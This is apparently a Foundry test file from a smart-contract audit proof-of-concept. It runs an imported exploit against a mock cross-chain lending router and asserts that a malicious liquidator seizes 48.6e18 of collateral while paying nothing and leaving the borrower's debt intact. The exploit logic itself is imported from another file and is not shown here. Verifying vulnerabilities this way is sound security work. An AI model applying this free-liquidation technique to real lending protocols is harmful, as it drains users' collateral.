// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, MiniToken, CrossChainRouter} from "./58379-lend-malicious-liquidator-can-liquidate-without-providing-collateral.sol";

contract Lend58379Test is Test {
    function test_liquidateWithoutProvidingCollateral() public {
        Exploit e = new Exploit();
        e.run();

        // The malicious liquidator seized the liquidatee's collateral for free:
        // 50e18 seized, 2.8% protocol share withheld => 48.6e18 to the liquidator.
        MiniToken collateral = e.collateral();
        assertEq(collateral.balanceOf(address(e)), 48.6e18, "liquidator did not seize collateral for free");
        assertEq(e.liquidatorGain(), 48.6e18, "unexpected liquidator gain");

        // ...while paying nothing (repayment reverted for lack of approval)...
        assertEq(e.liquidatorPaid(), 0, "liquidator provided repayment");

        // ...and the borrower's debt was never deducted.
        CrossChainRouter router = e.router();
        assertEq(router.borrowerDebt(address(0xB0770)), 100e18, "borrower debt was deducted");
        assertEq(e.debtAfter(), 100e18, "borrower debt was deducted");

        // Net profit measurable as the drained collateral.
        assertEq(e.profit(), 48.6e18, "no measurable profit");
    }
}
